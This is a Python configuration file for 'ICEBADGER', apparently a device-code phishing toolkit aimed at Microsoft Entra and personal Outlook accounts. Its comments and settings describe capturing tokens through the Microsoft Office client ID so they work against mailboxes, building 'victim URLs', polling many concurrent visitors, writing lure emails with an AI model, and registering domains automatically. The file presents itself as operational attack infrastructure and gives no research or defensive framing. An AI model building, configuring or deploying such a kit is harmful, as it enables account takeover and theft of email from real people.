# ── config.py ──────────────────────────────────────────────
import os
from pathlib import Path
from dotenv import load_dotenv

BASE_DIR = Path(__file__).parent.resolve()
ENV_PATH = BASE_DIR / '.env'
load_dotenv(dotenv_path=ENV_PATH)

class Config:
    BASE_DIR = BASE_DIR
    _raw_db = os.getenv("ICEBADGER_DB_PATH", "icebadger.db")
    DB_PATH = str((BASE_DIR / _raw_db).resolve()) if not os.path.isabs(_raw_db) else _raw_db
    
    # Microsoft Entra ID Specifics
    CLIENT_ID = os.getenv("ICEBADGER_CLIENT_ID")
    # First-party Microsoft Office client — supports device-code flow for
    # consumer (personal) accounts as well as work/school. Used when the
    # deployment targets personal accounts (outlook.com, live.com, etc.).
    PERSONAL_CLIENT_ID = os.getenv("ICEBADGER_PERSONAL_CLIENT_ID", "d3590ed6-52b3-4102-aeff-aad2292ab01c")
    TENANT_ID = os.getenv("ICEBADGER_TENANT_ID", "common")
    SCOPE = os.getenv("ICEBADGER_SCOPES", "https://graph.microsoft.com/.default openid profile offline_access")
    
    DEVICE_CODE_URL = os.getenv("ICEBADGER_DEVICE_CODE_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode")
    TOKEN_URL = os.getenv("ICEBADGER_TOKEN_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token")
    # v1 endpoints — proven working for personal (consumer) accounts with the
    # Office first-party client and resource=https://graph.windows.net.
    DEVICE_CODE_URL_V1 = "https://login.microsoftonline.com/common/oauth2/devicecode"
    TOKEN_URL_V1 = "https://login.microsoftonline.com/common/oauth2/token"
    # Resource requested for personal (consumer) captures. Microsoft Graph, not
    # graph.windows.net, so the captured token works against /me/messages and
    # /me/mailFolders straight away (the Office client carries Mail.ReadWrite).
    PERSONAL_RESOURCE = "https://graph.microsoft.com"
    
    # Polling
    POLL_INTERVAL = int(os.getenv("ICEBADGER_POLL_INTERVAL", 5))
    # Max simultaneous device-code polls. A serial poller only services one
    # pending visitor per interval, so a burst of concurrent visitors queues up
    # and times out before it is ever reached.
    POLL_CONCURRENCY = int(os.getenv("ICEBADGER_POLL_CONCURRENCY", 20))
    MAX_RETRIES = int(os.getenv("ICEBADGER_MAX_RETRIES", 3))
    RETRY_DELAY = float(os.getenv("ICEBADGER_RETRY_DELAY", 5.0))
    
    # Web Dashboard
    WEB_HOST = os.getenv("ICEBADGER_WEB_HOST", "0.0.0.0")
    WEB_PORT = int(os.getenv("ICEBADGER_WEB_PORT", 5000))

    # AI Email Writer
    GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "")

    # Dynadot API (for real-time domain search & automated registration)
    DYNADOT_API_KEY = os.getenv("DYNADOT_API_KEY", "")

    # Public-facing host used when building victim URLs (e.g. https://yourserver.com)
    DEPLOY_HOST = os.getenv("ICEBADGER_DEPLOY_HOST", "http://127.0.0.1:5000")

    if not CLIENT_ID:
        raise ValueError("ICEBADGER_CLIENT_ID must be set in environment or .env file")
